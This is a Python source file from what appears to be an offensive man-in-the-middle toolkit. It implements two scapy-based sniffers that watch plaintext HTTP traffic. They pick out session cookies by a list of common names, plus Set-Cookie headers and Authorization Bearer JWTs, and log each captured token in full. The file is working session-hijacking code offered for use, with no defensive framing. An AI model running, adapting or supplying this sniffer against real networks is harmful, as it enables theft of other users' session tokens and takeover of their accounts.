# S.P.E.C.T.R.E. Engine - Licensed under AGPL-3.0
# Copyright (c) 2026 M. Sami Furqan. All rights reserved.
# See LICENSE file for full terms.

"""
core/mitm/sniffer.py — Cookie sniffer and Session/JWT sniffer implementations.
"""

from __future__ import annotations

import time
from typing import TYPE_CHECKING

from core.mitm._scapy import Raw, TCP, IP, sniff, conf

if TYPE_CHECKING:
    from PySide6.QtCore import Signal

_SESSION_KEYS = [
    "sessionid", "phpsessid", "jsessionid", "connect.sid",
    "jwt", "token", "auth", "sid", "sess", "csrf_token",
]


# ── Cookie Sniffer ─────────────────────────────────────────────────────────────

def _analyze_cookies(cookie_string: str, src_ip: str, passive_log_signal: Signal) -> None:  # type: ignore[type-arg]
    found_sessions: list[str] = []
    for cookie in cookie_string.split(";"):
        cookie = cookie.strip()
        if "=" in cookie:
            key, value = cookie.split("=", 1)
            if key.lower() in _SESSION_KEYS:
                found_sessions.append(f"{key}={value}")
    if found_sessions:
        passive_log_signal.emit(f" SESSION TOKENS DETECTED from {src_ip}:", "CRIT")
        for sess in found_sessions:
            passive_log_signal.emit(f"   -> {sess}", "DATA")


def _parse_cookie_packet(packet: object, passive_log_signal: Signal) -> None:  # type: ignore[type-arg]
    try:
        if not packet.haslayer(Raw) or not packet.haslayer(TCP) or not packet.haslayer(IP):  # type: ignore[union-attr]
            return
        payload = packet[Raw].load.decode("utf-8", errors="ignore")  # type: ignore[index]
        src_ip = packet[IP].src  # type: ignore[index]
        if payload.startswith("GET ") or payload.startswith("POST "):
            for line in payload.split("\r\n"):
                if line.lower().startswith("cookie:"):
                    _analyze_cookies(line.split(":", 1)[1].strip(), src_ip, passive_log_signal)
                    break
    except Exception:
        pass


def run_cookie_sniffer(
    running_flag: list[bool],
    passive_log_signal: Signal,  # type: ignore[type-arg]
) -> None:
    """Sniff HTTP traffic for session cookies."""
    passive_log_signal.emit("Cookie & Session Sniffer Active. Listening for session tokens...", "INFO")
    passive_log_signal.emit("Targeting: sessionid, PHPSESSID, JSESSIONID, JWT, etc.", "WARN")
    while running_flag[0]:
        try:
            sniff(
                filter="tcp port 80",
                iface=conf.iface,
                prn=lambda pkt: _parse_cookie_packet(pkt, passive_log_signal),
                store=0,
                timeout=2,
            )
        except Exception:
            if running_flag[0]:
                time.sleep(0.5)


# ── Session & JWT Sniffer ──────────────────────────────────────────────────────

def _parse_session_packet(packet: object, passive_log_signal: Signal) -> None:  # type: ignore[type-arg]
    try:
        if not packet.haslayer(Raw) or not packet.haslayer(TCP) or not packet.haslayer(IP):  # type: ignore[union-attr]
            return
        payload = packet[Raw].load.decode("utf-8", errors="ignore")  # type: ignore[index]
        src_ip = packet[IP].src  # type: ignore[index]
        dst_ip = packet[IP].dst  # type: ignore[index]

        if payload.startswith("HTTP/1."):
            for line in payload.split("\r\n"):
                if line.lower().startswith("set-cookie:"):
                    cookie_data = line.split(":", 1)[1].strip()
                    if "sessionid=" in cookie_data.lower() or "sess=" in cookie_data.lower():
                        passive_log_signal.emit(f"🍪 SESSION COOKIE ISSUED to {dst_ip}:", "CRIT")
                        passive_log_signal.emit(f"   -> {cookie_data}", "DATA")

        if payload.startswith("GET ") or payload.startswith("POST "):
            for line in payload.split("\r\n"):
                if line.lower().startswith("authorization: bearer "):
                    jwt_token = line.split(":", 1)[1].strip().split(" ", 1)[1]
                    passive_log_signal.emit(f"🔑 JWT CAPTURED from {src_ip}:", "CRIT")
                    passive_log_signal.emit(f"   -> {jwt_token}", "DATA")
    except Exception:
        pass


def run_session_jwt_sniffer(
    running_flag: list[bool],
    passive_log_signal: Signal,  # type: ignore[type-arg]
) -> None:
    """Sniff HTTP traffic specifically for Session Cookies and JWT Bearer tokens."""
    passive_log_signal.emit("Session & JWT Sniffer Active. Hunting for tokens...", "INFO")
    passive_log_signal.emit("Targeting: Set-Cookie, Authorization: Bearer", "WARN")
    while running_flag[0]:
        try:
            sniff(
                filter="tcp port 80",
                iface=conf.iface,
                prn=lambda pkt: _parse_session_packet(pkt, passive_log_signal),
                store=0,
                timeout=2,
            )
        except Exception:
            if running_flag[0]:
                time.sleep(0.5)
